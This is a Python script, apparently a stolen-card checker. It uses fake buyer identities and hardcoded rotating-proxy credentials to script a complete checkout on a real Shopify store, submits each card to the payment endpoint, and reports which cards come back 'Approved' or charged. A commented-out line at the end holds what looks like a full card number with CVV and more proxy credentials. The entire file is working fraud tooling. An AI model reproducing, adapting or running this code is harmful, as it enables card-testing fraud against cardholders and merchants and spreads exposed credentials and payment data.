from bs4 import BeautifulSoup
import random
import aiohttp
import asyncio
import names
import platform
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

telephone = f'78{random.randint(1000,9999)}{random.randint(1000,9999)}'
CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def CMDkill(cc, proxyrand):
    timeout=20
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#        
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-ES,es;q=0.8,en-gb;q=0.5,en;q=0.3',
                    'Referer': 'https://www.a2zozone.com/products/1-4-check-valve',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.a2zozone.com',
                    'Connection': 'keep-alive',
                })
                try:
                    data = {
                        'Size': 'Qty: 5, 1/4" Purple Check Valve - Best Value!',
                        'quantity': '1',
                        'form_type': 'product',
                        'utf8': '✓',
                        'id': '31209555361835',
                        'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
                        'sections_url': '/products/1-4-check-valve',
                    }
                    async with session.post('https://www.a2zozone.com/cart/add', data=data, timeout=18, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:
                        response = await resp.text()
                        if (int(response.find('Cart Error')) > 0):
                            data = {
                                'quantity': '1',
                                'form_type': 'product',
                                'utf8': '✓',
                                'id': '31429211619371',
                                'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
                                'sections_url': '/products/12v-power-board-for-aqua-8-and-aquatic',
                            }
                            async with session.post('https://www.a2zozone.com/cart/add', data=data, timeout=18, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:
                                response = await resp.text()
                                if (int(response.find('Cart Error')) > 0):
                                    return "Stock Problem!"
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                try :
                    data = {
                        'checkout': '',
                    }
                    async with session.post('https://www.a2zozone.com/cart', data=data,proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=18) as resp:
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                        resp_realurl = str(resp.real_url)
                        checkout_token = resp_realurl.split("/")[5]
                        authenticity_token1 = soup.find("input", {"name": "authenticity_token"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except IndexError :
                    print(f"Error al conectarse {retry+1}/{max_retries}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    data = [
                        ('_method', 'patch'),
                        ('authenticity_token', authenticity_token1),
                        ('previous_step', 'contact_information'),
                        ('step', 'shipping_method'),
                        ('checkout[email]', CorreoRand),
                        ('checkout[buyer_accepts_marketing]', '0'),
                        ('checkout[shipping_address][first_name]', ''),
                        ('checkout[shipping_address][last_name]', ''),
                        ('checkout[shipping_address][company]', ''),
                        ('checkout[shipping_address][address1]', ''),
                        ('checkout[shipping_address][address2]', ''),
                        ('checkout[shipping_address][city]', ''),
                        ('checkout[shipping_address][country]', ''),
                        ('checkout[shipping_address][province]', ''),
                        ('checkout[shipping_address][zip]', ''),
                        ('checkout[shipping_address][phone]', ''),
                        ('checkout[shipping_address][country]', 'United States'),
                        ('checkout[shipping_address][first_name]', names.get_first_name()),
                        ('checkout[shipping_address][last_name]', names.get_last_name()),
                        ('checkout[shipping_address][company]', ''),
                        ('checkout[shipping_address][address1]', f'{random.randint(1000,9999)} South Flores Street'),
                        ('checkout[shipping_address][address2]', ''),
                        ('checkout[shipping_address][city]', 'San Antonio'),
                        ('checkout[shipping_address][province]', 'TX'),
                        ('checkout[shipping_address][zip]', '78204'),
                        ('checkout[shipping_address][phone]', f'(676) {random.randint(100,999)}-{random.randint(1000,9999)}'),
                        ('checkout[remember_me]', ''),
                        ('checkout[remember_me]', '0'),
                        ('checkout[client_details][browser_width]', '697'),
                        ('checkout[client_details][browser_height]', '927'),
                        ('checkout[client_details][javascript_enabled]', '1'),
                        ('checkout[client_details][color_depth]', '24'),
                        ('checkout[client_details][java_enabled]', 'false'),
                        ('checkout[client_details][browser_tz]', '300'),
                    ]
                    async with session.post(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=18) as resp:         
                        soup_response = await resp.text()
                        soup = BeautifulSoup(soup_response , 'lxml')
                        authenticity_token2 = soup.find("input", {"name": "authenticity_token"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️' 
                except TypeError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"

                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :  
                    data = {
                        '_method': 'patch',
                        'authenticity_token': authenticity_token2,
                        'previous_step': 'shipping_method',
                        'step': 'payment_method',
                        'checkout[shipping_rate][id]': 'usps-ParcelSelect-9.53-1680065999-1680065999',
                        'checkout[client_details][browser_width]': '1920',
                        'checkout[client_details][browser_height]': '927',
                        'checkout[client_details][javascript_enabled]': '1',
                        'checkout[client_details][color_depth]': '24',
                        'checkout[client_details][java_enabled]': 'false',
                        'checkout[client_details][browser_tz]': '300',
                    }
                    async with session.post(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:        
                        soup_response = await resp.text()
                        soup = BeautifulSoup(soup_response , 'lxml')
                        authenticity_token3 = soup.find("input", {"name": "authenticity_token"})["value"]
                        prices = (soup_response.split('data-checkout-payment-due-target="')[1]).split('">')[0]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                if mes[0:1] == '1': mesnew = mes
                else : mesnew = mes[1:2]

                headers = {
                    'Accept': 'application/json',
                    'Accept-Language': 'es-419,es;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Origin': 'https://checkout.shopifycs.com',
                    'Pragma': 'no-cache',
                    'Referer': 'https://checkout.shopifycs.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Sec-GPC': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
                }
                json_data = {
                    'credit_card': {
                        'number': ccnum,
                        'name': 'juan izaza',
                        'month': mesnew,
                        'year': ano,
                        'verification_value': cvv,
                    },
                    'payment_session_scope': 'www.a2zozone.com',
                }
                try :
                    async with session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data, timeout=timeout, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:              
                        jsonresponse = await resp.json()
                        token = jsonresponse["id"]
                except UnboundLocalError :
                    print(f"Error al conectarse {retry+1}/{max_retries}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"  
                except TypeError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3" 
                #---------------------------------REQUEST NUMERO 6------------------------------#
                #---------------------------------REQUEST NUMERO 6------------------------------#
                try:
                    data = {
                        '_method': 'patch',
                        'authenticity_token': authenticity_token3,
                        'previous_step': 'payment_method',
                        'step': '',
                        's': token,
                        'checkout[payment_gateway]': '6466885',
                        'checkout[credit_card][vault]': 'false',
                        'checkout[different_billing_address]': 'false',
                        'checkout[total_price]': prices,
                        'complete': '1',
                        'checkout[client_details][browser_width]': '697',
                        'checkout[client_details][browser_height]': '927',
                        'checkout[client_details][javascript_enabled]': '1',
                        'checkout[client_details][color_depth]': '24',
                        'checkout[client_details][java_enabled]': 'false',
                        'checkout[client_details][browser_tz]': '300',
                    }
                    async with session.post(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:               
                        True
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"    
                #---------------------------------REQUEST NUMERO 7------------------------------#
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try:
                    async with session.get(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}/processing', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 8------------------------------#
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    async with session.get(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}/processing?from_processing_page=1', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 9------------------------------#
                #---------------------------------REQUEST NUMERO 9------------------------------#
                try:
                    async with session.get(f'https://www.a2zozone.com/3476081/checkouts/{checkout_token}?from_processing_page=1&validate=true', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:         
                        response = await resp.text()
                        soup = BeautifulSoup(response, "html.parser")
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('CVD ERROR')) > 0) :
                    search = (soup.find_all("p", class_="notice__text"))[0]
                    search = str(search).replace('<p class="notice__text">',"").replace('</p>',"")
                    search = " ".join(search.split())
                    return "Approved", search
                elif int(response.find('"notice__text"')) > 0 :
                    search = (soup.find_all("p", class_="notice__text"))[0]
                    search = str(search).replace('<p class="notice__text">',"").replace('</p>',"")
                    search = " ".join(search.split())
                    return search
                elif int(response.find('Thank you for your purchase')) > 0 :
                    return "Approved", "Charged 19$"
                else :
                    return "3D Required. Please try again."
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()

#print(asyncio.run(CMDPayflowAuth("5469930097303995|08|2025|326", "http://fctmbbxo-rotate:x4zj0j8n7k82@p.webshare.io:80/")))
